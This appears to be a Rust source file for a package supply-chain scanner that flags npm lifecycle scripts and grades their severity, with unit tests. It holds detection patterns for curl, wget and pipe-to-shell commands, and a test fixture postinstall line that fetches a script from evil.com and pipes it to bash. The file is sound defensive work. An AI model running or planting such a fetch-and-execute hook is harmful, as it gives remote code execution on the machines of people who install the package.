use async_trait::async_trait;

use super::{Issue, PackageAnalyzer, PackageContext, Severity};
use crate::util::generate_issue_id;

const SUSPICIOUS_LIFECYCLE_EVENTS: &[&str] =
  &["preinstall", "install", "postinstall", "prepublish", "prepare", "prepack", "postpack"];

// Default allowed commands that are commonly safe in lifecycle scripts
const DEFAULT_ALLOWED_COMMANDS: &[&str] = &[
  // Package managers and build tools
  "npm run",
  "npm install",
  "npm ci",
  "npm rebuild",
  "yarn run",
  "yarn install",
  "pnpm run",
  "pnpm install",
  "lerna ",
  "nx ",
  "turbo ",
  // Git hooks
  "husky ",
  "husky install",
  "husky init",
  "is-ci",
  "lint-staged",
  "simple-git-hooks",
  "lefthook",
  // Common build tools
  "tsc",
  "typescript",
  "babel ",
  "webpack",
  "rollup",
  "esbuild",
  "vite ",
  "parcel ",
  "swc ",
  // Native module building
  "node-gyp",
  "prebuild",
  "prebuild-install",
  "cmake-js",
  "napi ",
  "node-pre-gyp",
  // Other common safe commands
  "patch-package",
  "ngcc",
  "opencollective",
  "echo ",
  "exit 0",
  "true",
  "rimraf",
  "shx ",
  "cross-env",
  "copyfiles",
  "ncp ",
  "cpy ",
  "cpx ",
];

pub struct ScriptsAnalyzer;

#[async_trait]
impl PackageAnalyzer for ScriptsAnalyzer {
  fn name(&self) -> &'static str {
    "scripts"
  }

  async fn analyze(&self, context: &PackageContext<'_>) -> Vec<Issue> {
    let mut issues = vec![];

    let scripts = match context.package_json.get("scripts") {
      Some(s) => s,
      None => return issues,
    };

    let scripts_obj = match scripts.as_object() {
      Some(o) => o,
      None => return issues,
    };

    let allowed_scripts = context
      .config
      .get_analyzer_config("scripts")
      .and_then(|c| c.allowed_scripts.clone())
      .unwrap_or_default();

    let additional_allowed_commands: Vec<String> = context
      .config
      .get_analyzer_config("scripts")
      .and_then(|c| c.allowed_commands.clone())
      .unwrap_or_default();

    for event in SUSPICIOUS_LIFECYCLE_EVENTS {
      if let Some(script) = scripts_obj.get(*event) {
        if let Some(script_str) = script.as_str() {
          // Skip if lifecycle event is explicitly allowed
          if allowed_scripts.contains(&event.to_string()) {
            continue;
          }

          // Skip if command matches default or configured allowed commands
          let script_lower = script_str.to_lowercase();
          let is_allowed = DEFAULT_ALLOWED_COMMANDS
            .iter()
            .any(|cmd| script_lower.starts_with(&cmd.to_lowercase()))
            || additional_allowed_commands
              .iter()
              .any(|cmd| script_lower.starts_with(&cmd.to_lowercase()));

          if is_allowed {
            continue;
          }

          // Determine severity based on the script content
          let severity = Self::get_severity_for_script(script_str);

          let message =
            format!("Package uses lifecycle script: \"{}\". Review for security.", event);

          let id = generate_issue_id(self.name(), context.name, 0, &message, Some(context.name));

          issues.push(Issue {
            issue_type: self.name().to_string(),
            line: 0,
            message,
            severity,
            code: Some(script_str.to_string()),
            analyzer: Some(self.name().to_string()),
            id: Some(id),
            file: None,
          });
        }
      }
    }

    issues
  }
}

impl ScriptsAnalyzer {
  /// Determine severity based on script content
  fn get_severity_for_script(script: &str) -> Severity {
    let script_lower = script.to_lowercase();

    // Critical: Remote code execution patterns
    if script_lower.contains("curl ")
      || script_lower.contains("wget ")
      || script_lower.contains("://")
      || script_lower.contains(" | bash")
      || script_lower.contains("|bash")
      || script_lower.contains(" | sh")
      || script_lower.contains("|sh")
      || script_lower.contains("eval ")
      || script_lower.contains("`")
      || script_lower.contains("$(")
    {
      return Severity::Critical;
    }

    // High: Direct shell or script execution
    if script_lower.contains("bash ")
      || script_lower.contains("sh ")
      || script_lower.contains("node ")
      || script_lower.contains(".sh")
      || script_lower.contains(".js")
    {
      return Severity::High;
    }

    // Medium: other lifecycle scripts
    Severity::Medium
  }
}

#[cfg(test)]
mod tests {
  use super::*;
  use std::path::PathBuf;

  #[test]
  fn test_analyzer_name() {
    let analyzer = ScriptsAnalyzer;
    assert_eq!(analyzer.name(), "scripts");
  }

  #[tokio::test]
  async fn test_detects_postinstall() {
    let analyzer = ScriptsAnalyzer;
    let config = crate::config::Config::default();

    let package_json = serde_json::json!({
        "name": "test-package",
        "scripts": {
            "postinstall": "node setup.js"
        }
    });

    let context = PackageContext {
      name: "test-package",
      version: "1.0.0",
      path: &PathBuf::from("/test"),
      package_json: &package_json,
      config: &config,
      prefetched: None,
    };

    let issues = analyzer.analyze(&context).await;

    assert_eq!(issues.len(), 1);
    assert!(issues[0].message.contains("postinstall"));
    // node *.js is high severity
    assert_eq!(issues[0].severity, Severity::High);
  }

  #[tokio::test]
  async fn test_detects_preinstall() {
    let analyzer = ScriptsAnalyzer;
    let config = crate::config::Config::default();

    let package_json = serde_json::json!({
        "name": "test-package",
        "scripts": {
            "preinstall": "python malicious.py"
        }
    });

    let context = PackageContext {
      name: "test-package",
      version: "1.0.0",
      path: &PathBuf::from("/test"),
      package_json: &package_json,
      config: &config,
      prefetched: None,
    };

    let issues = analyzer.analyze(&context).await;

    assert_eq!(issues.len(), 1);
    assert!(issues[0].message.contains("preinstall"));
  }

  #[tokio::test]
  async fn test_ignores_safe_scripts() {
    let analyzer = ScriptsAnalyzer;
    let config = crate::config::Config::default();

    let package_json = serde_json::json!({
        "name": "test-package",
        "scripts": {
            "test": "jest",
            "build": "tsc",
            "start": "node index.js"
        }
    });

    let context = PackageContext {
      name: "test-package",
      version: "1.0.0",
      path: &PathBuf::from("/test"),
      package_json: &package_json,
      config: &config,
      prefetched: None,
    };

    let issues = analyzer.analyze(&context).await;

    assert!(issues.is_empty());
  }

  #[tokio::test]
  async fn test_allowed_scripts() {
    let analyzer = ScriptsAnalyzer;
    let mut config = crate::config::Config::default();

    let mut analyzer_config = crate::config::AnalyzerConfig::default();
    analyzer_config.allowed_scripts = Some(vec!["postinstall".to_string()]);
    config.analyzers.insert("scripts".to_string(), analyzer_config);

    let package_json = serde_json::json!({
        "name": "test-package",
        "scripts": {
            "postinstall": "node setup.js"
        }
    });

    let context = PackageContext {
      name: "test-package",
      version: "1.0.0",
      path: &PathBuf::from("/test"),
      package_json: &package_json,
      config: &config,
      prefetched: None,
    };

    let issues = analyzer.analyze(&context).await;

    assert!(issues.is_empty());
  }

  #[tokio::test]
  async fn test_no_scripts() {
    let analyzer = ScriptsAnalyzer;
    let config = crate::config::Config::default();

    let package_json = serde_json::json!({
        "name": "test-package"
    });

    let context = PackageContext {
      name: "test-package",
      version: "1.0.0",
      path: &PathBuf::from("/test"),
      package_json: &package_json,
      config: &config,
      prefetched: None,
    };

    let issues = analyzer.analyze(&context).await;

    assert!(issues.is_empty());
  }

  #[tokio::test]
  async fn test_allows_husky_install() {
    let analyzer = ScriptsAnalyzer;
    let config = crate::config::Config::default();

    let package_json = serde_json::json!({
        "name": "test-package",
        "scripts": {
            "prepare": "husky install"
        }
    });

    let context = PackageContext {
      name: "test-package",
      version: "1.0.0",
      path: &PathBuf::from("/test"),
      package_json: &package_json,
      config: &config,
      prefetched: None,
    };

    let issues = analyzer.analyze(&context).await;

    assert!(issues.is_empty(), "husky install should be allowed by default");
  }

  #[tokio::test]
  async fn test_allows_npm_run_build() {
    let analyzer = ScriptsAnalyzer;
    let config = crate::config::Config::default();

    let package_json = serde_json::json!({
        "name": "test-package",
        "scripts": {
            "postinstall": "npm run build"
        }
    });

    let context = PackageContext {
      name: "test-package",
      version: "1.0.0",
      path: &PathBuf::from("/test"),
      package_json: &package_json,
      config: &config,
      prefetched: None,
    };

    let issues = analyzer.analyze(&context).await;

    assert!(issues.is_empty(), "npm run build should be allowed by default");
  }

  #[tokio::test]
  async fn test_allows_node_gyp() {
    let analyzer = ScriptsAnalyzer;
    let config = crate::config::Config::default();

    let package_json = serde_json::json!({
        "name": "test-package",
        "scripts": {
            "install": "node-gyp rebuild"
        }
    });

    let context = PackageContext {
      name: "test-package",
      version: "1.0.0",
      path: &PathBuf::from("/test"),
      package_json: &package_json,
      config: &config,
      prefetched: None,
    };

    let issues = analyzer.analyze(&context).await;

    assert!(issues.is_empty(), "node-gyp rebuild should be allowed by default");
  }

  #[tokio::test]
  async fn test_critical_severity_for_curl() {
    let analyzer = ScriptsAnalyzer;
    let config = crate::config::Config::default();

    let package_json = serde_json::json!({
        "name": "test-package",
        "scripts": {
            "postinstall": "curl http://evil.com/script.sh | bash"
        }
    });

    let context = PackageContext {
      name: "test-package",
      version: "1.0.0",
      path: &PathBuf::from("/test"),
      package_json: &package_json,
      config: &config,
      prefetched: None,
    };

    let issues = analyzer.analyze(&context).await;

    assert_eq!(issues.len(), 1);
    assert_eq!(issues[0].severity, Severity::Critical);
  }

  #[tokio::test]
  async fn test_allows_lerna() {
    let analyzer = ScriptsAnalyzer;
    let config = crate::config::Config::default();

    let package_json = serde_json::json!({
        "name": "test-package",
        "scripts": {
            "postinstall": "lerna bootstrap"
        }
    });

    let context = PackageContext {
      name: "test-package",
      version: "1.0.0",
      path: &PathBuf::from("/test"),
      package_json: &package_json,
      config: &config,
      prefetched: None,
    };

    let issues = analyzer.analyze(&context).await;

    assert!(issues.is_empty(), "lerna commands should be allowed by default");
  }
}
